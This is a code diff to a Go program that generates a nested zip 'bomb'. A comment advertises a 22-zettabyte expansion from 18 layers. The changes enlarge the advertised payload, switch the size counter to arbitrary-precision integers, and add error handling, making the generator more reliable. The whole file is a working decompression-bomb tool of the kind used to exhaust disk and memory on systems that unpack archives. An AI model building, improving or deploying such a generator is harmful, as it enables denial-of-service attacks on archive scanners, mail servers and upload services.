@@ -2,11 +2,12 @@
 
 	// ./<bin> <amount of layers>
 
-	// supernova with 5500 Petabyte
-	// ./<bin> 15
+	// supernova with 22 Zettabytes
+	// ./<bin> 18
 
 	import (
 		"archive/zip"
+		"math/big"
 		"io"
 		"fmt"
 		"os"
@@ -48,9 +49,14 @@
 
 		header.Method = zip.Deflate
 		writer, err := zipWriter.CreateHeader(header)
-		if err != nil {}
+		if err != nil {
+			return err
+		}
 		_, err = io.Copy(writer, fileToZip)
-		return err
+		if err != nil {
+			return err
+		}
+		return nil
 	}
 
 	func CopyAndCompress(file string, count int) error {
@@ -73,9 +79,15 @@
 				defer wg.Done() // Decrement the counter when the goroutine completes
 				zipName := fmt.Sprintf("%d.zip", i)
 				err = ioutil.WriteFile(zipName, bytesRead, 0755)
-				if err != nil {}
+				if err != nil {
+					fmt.Println("Error writing file:", err)
+					return
+				}
 				err = AddFileToZip(zipWriter, zipName)
-				if err != nil {}
+				if err != nil {
+					fmt.Println("Error adding file to zip:", err)
+					return
+				}
 				os.Remove(zipName)
 			}(i)
 		}
@@ -104,14 +116,14 @@
 		err = ZipFiles(level1, dummyFile)
 		if err != nil {}
 
-		decompressionSize := 24214 * 10 // Initialize based on the size of 10 zip files
+		decompressionSize := big.NewInt(24214 * 10) // Initialize based on the size of 10 zip files
 		for i := 1; i < levels; i++ {
-			decompressionSize *= 10 // Adjust for the number of files at each level
+			decompressionSize.Mul(decompressionSize, big.NewInt(10)) // Use Mul method for big.Int
 			zipName := fmt.Sprintf("level%d.zip", i)
 			err = CopyAndCompress(zipName, i)
 			if err != nil {}
 		}
-		decompressionSize = decompressionSize / (1024 * 1024) // Convert to MB
+		decompressionSize = new(big.Int).Div(decompressionSize, big.NewInt(1024*1024)) // Convert to MB
 
 		// Rename the last level zip archive
 		bombLevel := fmt.Sprintf("level%d.zip", levels)
